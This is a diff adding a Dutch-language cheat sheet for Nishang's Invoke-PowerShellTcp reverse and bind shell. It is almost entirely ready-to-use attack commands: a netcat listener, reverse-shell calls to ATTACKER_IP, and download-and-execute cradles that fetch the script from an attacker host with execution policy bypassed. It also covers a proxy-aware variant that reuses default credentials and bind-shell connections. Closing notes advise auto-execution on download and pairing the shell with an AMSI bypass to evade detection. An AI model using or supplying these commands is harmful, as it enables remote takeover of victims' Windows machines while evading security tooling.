@@ -1,0 +1,43 @@
+# Invoke-PowerShellTcp — PowerShell reverse/bind shell (Nishang)
+# TCP reverse of bind shell volledig in PowerShell, onderdeel van Nishang framework
+#
+# === Syntax ===
+# Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
+# Invoke-PowerShellTcp -Bind -Port PORT
+#
+# === Belangrijkste opties ===
+# -Reverse       Reverse shell (verbindt terug naar attacker)
+# -Bind          Bind shell (luistert op doelwit)
+# -IPAddress     IP adres om naar te verbinden (bij -Reverse)
+# -Port          Poortnummer
+#
+# === Voorbeelden ===
+
+# Reverse shell — eerst listener starten op attacker
+# Attacker:
+nc -lvnp 443
+
+# Op doelwit — reverse shell starten
+Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 443
+
+# One-liner download en execute (meest gebruikt)
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 443
+
+# Encoded one-liner via PowerShell
+powershell -ep bypass -e <BASE64_ENCODED_COMMAND>
+
+# Bind shell op doelwit (luistert op poort)
+Invoke-PowerShellTcp -Bind -Port 4444
+
+# Verbinden met bind shell vanaf attacker
+nc TARGET 4444
+
+# Via download cradle in een commando
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 443"
+
+# WebClient variant (proxy-aware)
+powershell -ep bypass -c "$w=New-Object Net.WebClient;$w.Proxy=[Net.WebRequest]::DefaultWebProxy;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')"
+
+# Noot: Voeg de functie-aanroep toe aan het einde van het .ps1 bestand
+#        voor automatische uitvoering bij download
+# Noot: Wordt gedetecteerd door AMSI — combineer met AMSI bypass
